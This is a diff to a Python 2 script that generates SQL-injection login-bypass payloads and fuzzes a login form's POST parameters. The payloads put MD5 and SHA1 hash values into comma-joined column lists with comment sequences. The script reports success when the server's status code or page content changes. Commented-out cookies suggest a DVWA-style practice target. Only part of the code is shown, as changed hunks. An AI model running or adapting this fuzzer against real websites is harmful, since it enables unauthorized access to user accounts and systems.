@@ -32,7 +32,8 @@ def gen_payload(seq='#,/*'):
 	    #print "templist:",templist
 	    for z in range(len(templist)):
 	        t=templist[z]
-		templist[z]="'c4ca4238a0b923820dcc509a6f75849b'"
+		#templist[z]="'c4ca4238a0b923820dcc509a6f75849b'"
+		templist[z]="'356a192b7913b04c54574d18c28d46e6395428ab'"
 		dictx.append(','.join(templist))
 		templist[z]=t
             #print dictx
@@ -48,8 +49,15 @@ def gen_payload(seq='#,/*'):
 
 def geturlcontent(url,postdata,pattern):
     #print postdata
+    '''
+    cookies=dict()
+    cookies['security_level']='0'
+    cookies['has_js']='1'
+    cookies['PHPSESSID']='98d8fa0b4d6cb55d16686ba86c36c847'
+    '''
     headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:22.0) Gecko/20100101 Firefox/22.0'}
     try:
+        #r = requests.post(url=url,data=postdata,headers=headers,cookies=cookies)
         r = requests.post(url=url,data=postdata,headers=headers)
     except:
         print >> sys.stderr,'maybe can\'t connect the website',url
@@ -63,15 +71,23 @@ def geturlcontent(url,postdata,pattern):
     #if content.find('not log you in')==-1:
     if patterncode !='':
         if status_code!=int(pattern):
+	    #pass
             print '\033[1;31;40mSuccess,the password is:\033[0m'
 	    print 'payload:',post_data
 	    print 'postdata:',postdata
+	    exit()
 
     if patterncontent!='':
+        #print pattern
+	#print content
+        #print content.find(pattern)
+	#exit()
         if content.find(pattern)==-1:
+	    #pass
             print '\033[1;31;40mSuccess,the password is:\033[0m'
 	    print 'payload:',post_data
 	    print 'postdata:',postdata
+	    #exit()
     #status_code=r.status_code
     #print 'content:',content
     #print 'status_code',status_code
@@ -105,7 +121,9 @@ if __name__=="__main__":
         #print 'payload_dict:\n',payload_dict,len(payload_dict)
 	#for i in payload_dict:
 	#   print i
-        for i in params.split('&'):
+        
+        paramslist=params.split('&')
+	for i in paramslist:
             b=i.split('=')
             post_data[b[0]]=b[1]
             if b[1]=='FUZZ':
@@ -115,21 +133,21 @@ if __name__=="__main__":
             #print post_data
             geturlcontent(url,urllib.urlencode(post_data),sys.argv[5])
 	
-	
-	for i in post_data:
-	    post_data[i]='1'
-        #print '#################'
-	#print post_data 
-	#print '#################'
 
-	for i in post_data:
-	    for j in def_payload_dict:
-	        post_data[i]=j
-                #print 'label:',post_data
-                geturlcontent(url,urllib.urlencode(post_data),sys.argv[5])
-            for k in post_data:
-	        post_data[k]='1'
+        #print post_data
+	#print fuzzparam
+	#print '###################################################################'
+        
 
+
+
+        #exit()
+	for j in def_payload_dict:
+	    post_data[fuzzparam]=j
+            geturlcontent(url,urllib.urlencode(post_data),sys.argv[5])
+
+            #print post_data
+	#print '###################################################################'
     else:
         print 'input error parameter.\nexit'
 	exit()
